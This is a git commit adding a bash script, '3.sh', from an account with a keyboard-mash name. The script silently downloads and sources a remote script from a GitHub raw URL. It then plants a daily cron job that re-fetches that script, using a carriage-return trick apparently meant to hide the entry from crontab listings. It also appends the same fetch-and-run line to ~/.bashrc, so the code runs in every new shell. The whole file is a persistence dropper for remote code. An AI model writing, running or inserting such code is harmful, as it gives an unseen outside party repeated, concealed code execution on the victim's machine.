f6f2cf7d84893864e4e5a3cb394058ad7cac98a7
qwertyuiopasdfghjklzxcvbnmyxsc-svg <qwertyuiopasdfghjklzxcvbnmyxsc@gmail.com>
2026-01-29 16:34:39 +0800

    Create 3.sh

---
+++ 3.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+
+/bin/bash -c "source <(wget -q -O - https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh || curl -sL https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh)" >/dev/null 2>&1
+
+(crontab -l;echo '0 0 * * * /bin/bash -c "source <(wget -q -O - https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh || curl -sL https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh)";\rno crontw_wab for `whoami` %100 c\n')|crontab -
+
+
+echo '/bin/bash -c "source <(wget -q -O - https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh || curl -sL https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh)" >/dev/null 2>&1' >> ~/.bashrc
